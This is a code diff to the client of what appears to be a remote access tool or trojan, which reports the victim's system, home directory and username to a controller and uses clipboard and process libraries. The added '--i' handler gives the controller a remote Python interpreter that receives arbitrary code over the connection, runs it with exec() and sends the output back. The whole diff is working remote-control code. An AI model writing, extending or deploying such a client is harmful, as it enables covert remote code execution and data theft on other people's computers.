@@ -8,6 +8,8 @@ import subprocess
 import sys
 import threading
 import time
+import traceback
+from io import StringIO
 
 import psutil
 import pyperclip
@@ -227,6 +229,37 @@ class Client(object):
             if data[0] == '<INFO>':
                 self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
                 continue
+
+            if data[0] == '--i':
+                self.send(b'<READY>')
+                while 1:
+                    command = self.receive().decode()
+                    if command == '<QUIT>':
+                        self.send(b'Quitting Python Interpreter...')
+                        break
+                    old_stdout = sys.stdout
+                    redirected_output = sys.stdout = StringIO()
+                    try:
+                        exec(command)
+                    except SyntaxError as e:
+                        error_class = e.__class__.__name__
+                        detail = e.args[0]
+                        line_number = e.lineno
+                    except Exception as e:
+                        error_class = e.__class__.__name__
+                        detail = e.args[0]
+                        _, _, tb = sys.exc_info()
+                        line_number = traceback.extract_tb(tb)[-1][1]
+                    finally:
+                        sys.stdout = old_stdout
+                    description = 'python interpreter string'
+                    try:
+                        error = "InterpreterError: %s at line %d of %s: %s" % (error_class, line_number, description, detail)
+                        del line_number
+                    except Exception:
+                        error = None
+                    self.send(json.dumps([redirected_output.getvalue(), error]).encode())
+                    
 
             if data[0] == '--x':
                 if data[1] == '1':
